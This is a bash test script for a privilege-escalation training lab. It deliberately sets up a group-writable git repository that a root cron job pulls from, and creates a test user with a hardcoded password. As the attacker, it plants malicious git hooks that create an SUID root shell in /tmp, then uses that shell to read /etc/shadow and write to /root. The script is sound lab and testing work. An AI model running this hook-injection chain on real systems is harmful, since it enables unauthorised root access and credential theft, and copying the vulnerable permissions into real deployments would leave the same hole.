#!/bin/bash
#
# Automated Test Script for Privilege Escalation Lab
# Scenario: Git Hook Injection → Root
#
# Must be run as root: sudo ./test_lab.sh
#

export PATH="/usr/sbin:/sbin:$PATH"

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Counters
PASS=0
FAIL=0

# Test user
TEST_USER="developer"
TEST_PASS="developer123"
TEST_GROUP="devteam"

#######################################
# Logging functions
#######################################
log_header() {
    echo ""
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}  $1${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
}

log_phase() {
    echo ""
    echo -e "${BLUE}┌──────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ ${BOLD}$1${NC}"
    echo -e "${BLUE}└──────────────────────────────────────────────────────────────┘${NC}"
}

log_step() {
    echo -e "${YELLOW}  ► $1${NC}"
}

log_check() {
    echo -n "    [CHECK] $1 ... "
}

log_pass() {
    echo -e "${GREEN}✓ PASS${NC}"
    PASS=$((PASS + 1))
}

log_fail() {
    echo -e "${RED}✗ FAIL${NC}"
    echo -e "${RED}      Expected: $1${NC}"
    echo -e "${RED}      Got: $2${NC}"
    FAIL=$((FAIL + 1))
}

log_info() {
    echo -e "    ${CYAN}ℹ $1${NC}"
}

log_attack() {
    echo -e "    ${RED}⚔ $1${NC}"
}

#######################################
# Cleanup function
#######################################
cleanup() {
    log_phase "CLEANUP"

    # Kill user processes
    pkill -u "$TEST_USER" 2>/dev/null || true

    # Remove user and group
    userdel -r "$TEST_USER" 2>/dev/null || true
    groupdel "$TEST_GROUP" 2>/dev/null || true

    # Remove deployment infrastructure
    rm -f /etc/cron.d/deploy-webapp 2>/dev/null || true
    rm -f /usr/local/bin/deploy-webapp.sh 2>/dev/null || true
    rm -rf /srv/git 2>/dev/null || true
    rm -rf /var/www/webapp 2>/dev/null || true
    rm -f /var/log/deploy.log 2>/dev/null || true

    # Remove exploitation artifacts
    rm -f /tmp/rootbash 2>/dev/null || true
    rm -f /tmp/pwned.txt 2>/dev/null || true
    rm -f /root/pwned_by_developer 2>/dev/null || true

    log_info "Cleanup complete"
}

#######################################
# Pre-flight checks
#######################################
preflight() {
    log_phase "PRE-FLIGHT CHECKS"

    log_check "Running as root"
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}✗ FAIL${NC}"
        echo "This script must be run as root (sudo ./test_lab.sh)"
        exit 1
    fi
    log_pass

    log_check "Git available"
    if command -v git &> /dev/null; then
        log_pass
    else
        log_fail "git installed" "git not found"
        exit 1
    fi

    log_step "Cleaning any previous test artifacts..."
    cleanup
}

#######################################
# PHASE 0: Setup environment
#######################################
phase_0() {
    log_phase "PHASE 0 — Environment Setup (Simulating DevOps)"

    log_step "Creating development team group..."
    groupadd "$TEST_GROUP"

    log_step "Creating developer user..."
    useradd -m -s /bin/bash -G "$TEST_GROUP" "$TEST_USER"
    echo "$TEST_USER:$TEST_PASS" | chpasswd

    log_check "Developer user created with group membership"
    if id "$TEST_USER" | grep -q "$TEST_GROUP"; then
        log_pass
    else
        log_fail "user in devteam" "user not in group"
    fi

    log_step "Creating shared git repository..."
    mkdir -p /srv/git/webapp.git
    cd /srv/git/webapp.git
    git init --bare --quiet

    # Set group-writable permissions (the vulnerability)
    chown -R root:"$TEST_GROUP" /srv/git/webapp.git
    chmod -R g+rwX /srv/git/webapp.git
    find /srv/git/webapp.git -type d -exec chmod g+s {} \;

    log_check "Repository created with group-writable hooks"
    PERMS=$(stat -c '%A' /srv/git/webapp.git/hooks)
    if [[ "$PERMS" == *"rwx"* ]]; then
        log_pass
    else
        log_fail "group writable" "$PERMS"
    fi

    log_step "Initializing repository with content..."
    TEMP_DIR=$(mktemp -d)
    cd "$TEMP_DIR"
    git clone /srv/git/webapp.git . --quiet
    git config user.email "admin@example.com"
    git config user.name "Admin"
    echo "<html><body>Hello World</body></html>" > index.html
    git add index.html
    git commit -m "Initial commit" --quiet
    git push origin main --quiet 2>/dev/null || git push origin master --quiet 2>/dev/null || true
    cd /
    rm -rf "$TEMP_DIR"

    log_step "Creating deployment script..."
    cat > /usr/local/bin/deploy-webapp.sh << 'SCRIPT'
#!/bin/bash
REPO="/srv/git/webapp.git"
DEPLOY_DIR="/var/www/webapp"
LOG="/var/log/deploy.log"

echo "[$(date)] Starting deployment" >> "$LOG"

mkdir -p "$DEPLOY_DIR"

if [[ -d "$DEPLOY_DIR/.git" ]]; then
    cd "$DEPLOY_DIR"
    git pull origin main 2>> "$LOG" || git pull origin master 2>> "$LOG" || true
else
    git clone "$REPO" "$DEPLOY_DIR" 2>> "$LOG"
    cd "$DEPLOY_DIR"
fi

echo "[$(date)] Deployment complete" >> "$LOG"
SCRIPT

    chmod 755 /usr/local/bin/deploy-webapp.sh
    chown root:root /usr/local/bin/deploy-webapp.sh

    log_step "Creating cron job..."
    echo "*/5 * * * * root /usr/local/bin/deploy-webapp.sh" > /etc/cron.d/deploy-webapp
    chmod 644 /etc/cron.d/deploy-webapp

    log_check "Cron job installed"
    if [[ -f /etc/cron.d/deploy-webapp ]]; then
        log_pass
    else
        log_fail "cron exists" "not found"
    fi

    # Create log file
    touch /var/log/deploy.log
    chmod 644 /var/log/deploy.log

    log_info "Environment setup complete"
    log_info "Trust boundary: root runs git on developer-writable repository"
}

#######################################
# PHASE 1: Verify attacker has no privileges
#######################################
phase_1() {
    log_phase "PHASE 1 — Verify Attacker Starts Unprivileged"

    log_check "Developer has no sudo access"
    SUDO_CHECK=$(su - "$TEST_USER" -c 'sudo -l' 2>&1 || true)
    if echo "$SUDO_CHECK" | grep -qi "may not run sudo\|not in the sudoers\|not allowed"; then
        log_pass
    else
        log_fail "no sudo" "$SUDO_CHECK"
    fi

    log_check "Developer cannot modify deployment script"
    WRITE_CHECK=$(su - "$TEST_USER" -c 'echo test >> /usr/local/bin/deploy-webapp.sh' 2>&1 || true)
    if echo "$WRITE_CHECK" | grep -qi "permission denied"; then
        log_pass
    else
        log_fail "permission denied" "$WRITE_CHECK"
    fi

    log_check "Developer CAN write to hooks directory"
    su - "$TEST_USER" -c 'touch /srv/git/webapp.git/hooks/test && rm /srv/git/webapp.git/hooks/test'
    if [[ $? -eq 0 ]]; then
        log_pass
    else
        log_fail "write access" "no write access"
    fi

    log_info "Attacker can write to git hooks but not deployment script"
}

#######################################
# PHASE 2: Attacker enumeration
#######################################
phase_2() {
    log_phase "PHASE 2 — Attacker Enumeration"

    log_step "Attacker discovers git repositories..."

    log_check "Attacker finds /srv/git/webapp.git"
    FIND_RESULT=$(su - "$TEST_USER" -c 'find /srv -name "*.git" -type d 2>/dev/null' || true)
    if echo "$FIND_RESULT" | grep -q "webapp.git"; then
        log_pass
    else
        log_fail "repository found" "$FIND_RESULT"
    fi

    log_step "Attacker examines cron jobs..."

    log_check "Attacker can read cron configuration"
    CRON_CONTENT=$(su - "$TEST_USER" -c 'cat /etc/cron.d/deploy-webapp 2>/dev/null' || true)
    if echo "$CRON_CONTENT" | grep -q "deploy-webapp.sh"; then
        log_pass
    else
        log_fail "cron readable" "cannot read cron"
    fi

    log_check "Deployment script uses git"
    SCRIPT_CONTENT=$(su - "$TEST_USER" -c 'cat /usr/local/bin/deploy-webapp.sh')
    if echo "$SCRIPT_CONTENT" | grep -q "git"; then
        log_pass
    else
        log_fail "git command found" "no git command"
    fi

    log_info "Attacker identifies: root runs git pull/clone on writable repo"
    log_info "Attack vector: Git hook injection"
}

#######################################
# PHASE 3: Exploitation
#######################################
phase_3() {
    log_phase "PHASE 3 — Exploitation"

    log_step "Attacker creates malicious post-merge hook..."
    su - "$TEST_USER" -c 'cat > /srv/git/webapp.git/hooks/post-merge << '\''EOF'\''
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
echo "Pwned at $(date)" > /tmp/pwned.txt
chmod 644 /tmp/pwned.txt
EOF'
    su - "$TEST_USER" -c 'chmod +x /srv/git/webapp.git/hooks/post-merge'

    log_check "post-merge hook created"
    if [[ -f /srv/git/webapp.git/hooks/post-merge ]]; then
        log_pass
    else
        log_fail "hook exists" "not found"
    fi

    log_step "Attacker creates malicious post-checkout hook..."
    su - "$TEST_USER" -c 'cat > /srv/git/webapp.git/hooks/post-checkout << '\''EOF'\''
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
echo "Pwned at $(date)" > /tmp/pwned.txt
chmod 644 /tmp/pwned.txt
EOF'
    su - "$TEST_USER" -c 'chmod +x /srv/git/webapp.git/hooks/post-checkout'

    log_check "post-checkout hook created"
    if [[ -f /srv/git/webapp.git/hooks/post-checkout ]]; then
        log_pass
    else
        log_fail "hook exists" "not found"
    fi

    log_step "Attacker pushes a commit to trigger merge..."
    su - "$TEST_USER" -c '
        cd /tmp
        rm -rf work 2>/dev/null
        git clone /srv/git/webapp.git work --quiet 2>/dev/null
        cd work
        git config user.email "developer@example.com"
        git config user.name "Developer"
        echo "<!-- Update -->" >> index.html
        git add index.html
        git commit -m "Update" --quiet
        git push origin main --quiet 2>/dev/null || git push origin master --quiet 2>/dev/null || true
        cd /
        rm -rf /tmp/work
    '

    log_info "Hooks staged, commit pushed"
    log_attack "When root runs git pull, hooks execute as root"
}

#######################################
# PHASE 4: Trigger and verify
#######################################
phase_4() {
    log_phase "PHASE 4 — Root Executes Git Operations"

    log_step "Simulating cron execution (root runs deployment)..."
    /usr/local/bin/deploy-webapp.sh 2>/dev/null || true

    log_check "/tmp/rootbash exists"
    if [[ -f /tmp/rootbash ]]; then
        log_pass
    else
        log_fail "file exists" "not found (hooks did not execute)"
        return
    fi

    log_check "/tmp/rootbash owned by root"
    OWNER=$(stat -c '%U' /tmp/rootbash)
    if [[ "$OWNER" == "root" ]]; then
        log_pass
    else
        log_fail "root" "$OWNER"
    fi

    log_check "/tmp/rootbash has SUID bit"
    PERMS=$(stat -c '%a' /tmp/rootbash)
    if [[ "$PERMS" == "4755" ]]; then
        log_pass
    else
        log_fail "4755" "$PERMS"
    fi

    log_check "/tmp/pwned.txt created"
    if [[ -f /tmp/pwned.txt ]]; then
        log_pass
        log_info "Contents: $(cat /tmp/pwned.txt)"
    else
        log_fail "file exists" "not found"
    fi

    log_attack "SUID root shell created at /tmp/rootbash"
}

#######################################
# PHASE 5: Prove root access
#######################################
phase_5() {
    log_phase "PHASE 5 — Privilege Escalation Verification"

    if [[ ! -f /tmp/rootbash ]]; then
        log_info "Skipping — SUID shell was not created"
        return
    fi

    log_step "Attacker executes SUID shell..."

    log_check "Developer achieves euid=0 (root)"
    ID_CHECK=$(su - "$TEST_USER" -c '/tmp/rootbash -p -c "id"' 2>&1)
    if echo "$ID_CHECK" | grep -q "euid=0"; then
        log_pass
        log_info "ID output: $ID_CHECK"
    else
        log_fail "euid=0(root)" "$ID_CHECK"
    fi

    log_check "Developer can read /etc/shadow"
    SHADOW_CHECK=$(su - "$TEST_USER" -c '/tmp/rootbash -p -c "head -1 /etc/shadow"' 2>&1)
    if echo "$SHADOW_CHECK" | grep -q ":"; then
        log_pass
    else
        log_fail "shadow content" "$SHADOW_CHECK"
    fi

    log_check "Developer can write to /root"
    su - "$TEST_USER" -c '/tmp/rootbash -p -c "touch /root/pwned_by_developer"' 2>&1
    if [[ -f /root/pwned_by_developer ]]; then
        log_pass
    else
        log_fail "file created" "file not created"
    fi

    echo ""
    log_attack "╔═══════════════════════════════════════════════════════════╗"
    log_attack "║         PRIVILEGE ESCALATION SUCCESSFUL                   ║"
    log_attack "║                                                           ║"
    log_attack "║   Started as:  developer (uid=1001)                       ║"
    log_attack "║   Achieved:    root (euid=0)                              ║"
    log_attack "║   Method:      Git Hook Injection                         ║"
    log_attack "╚═══════════════════════════════════════════════════════════╝"
}

#######################################
# Summary
#######################################
summary() {
    log_header "TEST SUMMARY"

    echo ""
    echo -e "  Tests passed: ${GREEN}${BOLD}$PASS${NC}"
    echo -e "  Tests failed: ${RED}${BOLD}$FAIL${NC}"
    echo ""

    if [[ $FAIL -eq 0 ]]; then
        echo -e "${GREEN}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}${BOLD}  ║           ALL TESTS PASSED — LAB IS FUNCTIONAL            ║${NC}"
        echo -e "${GREEN}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "  The lab correctly demonstrates:"
        echo "    1. Developer with write access to git hooks"
        echo "    2. Root cron job running git operations"
        echo "    3. Git hook injection attack"
        echo "    4. Privilege escalation from developer to root"
        echo ""
        echo "  Attack chain:"
        echo "    developer → git hook injection → root (euid=0)"
        echo ""
    else
        echo -e "${RED}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}${BOLD}  ║              SOME TESTS FAILED — REVIEW OUTPUT            ║${NC}"
        echo -e "${RED}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
    fi
}

#######################################
# Main
#######################################
main() {
    log_header "Privilege Escalation Lab — Automated Test"
    echo ""
    echo "  Scenario: Shared Development Repository"
    echo "  Attack:   Git Hook Injection"
    echo "  Goal:     developer → root (euid=0)"

    trap cleanup EXIT

    preflight
    phase_0
    phase_1
    phase_2
    phase_3
    phase_4
    phase_5
    summary
}

main "$@"
